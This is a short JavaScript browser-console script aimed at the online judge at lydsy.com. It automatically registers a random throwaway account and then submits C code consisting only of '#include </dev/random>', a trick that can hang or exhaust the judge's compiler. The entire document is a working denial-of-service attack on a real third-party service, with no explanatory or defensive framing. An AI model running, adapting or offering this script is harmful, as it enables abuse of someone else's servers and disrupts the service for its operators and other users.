let uid = 'Test' + Math.random().toString().replace(/\D/img, '').substr(0, 20)
let code = `#include </dev/random>`
var register = function () {
  $.post('http://www.lydsy.com/JudgeOnline/register.php', {
    user_id: uid,
    password: 'Asswecan',
    rptpassword: 'Asswecan'
  }, submit)
}
var submit = function () {
  $.post('http://www.lydsy.com/JudgeOnline/submit.php', {
    id: 1000,
    language: 1,
    source: code
  }, function (data) {
    console.log(data)
  })
}
let k = document.createElement('script')
k.src = 'https://cdn.staticfile.org/jquery/3.2.1/jquery.min.js'
document.head.appendChild(k)
setTimeout(register, 1000)

